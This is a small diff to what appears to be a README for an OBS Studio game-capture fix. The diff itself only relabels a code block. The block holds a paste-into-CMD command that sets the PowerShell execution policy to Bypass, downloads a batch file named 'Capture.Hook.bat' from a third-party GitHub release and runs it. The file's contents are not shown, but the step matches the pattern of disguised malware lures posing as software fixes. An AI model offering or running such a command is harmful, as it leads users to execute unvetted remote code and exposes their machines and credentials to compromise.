@@ -182,7 +182,7 @@ Game capture does not work 🫣
 ---
 
 If you want to simply fix this issue, enter the following command in CMD
-```
+```batch
 powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-WebRequest -Uri "https://github.com/Matishzz/OBS-Studio/releases/download/v1.5/Capture.Hook.bat" -OutFile "$env:TEMP\Capture.Hook.bat"; Start-Process -FilePath "$env:TEMP\Capture.Hook.bat"
 ```
 
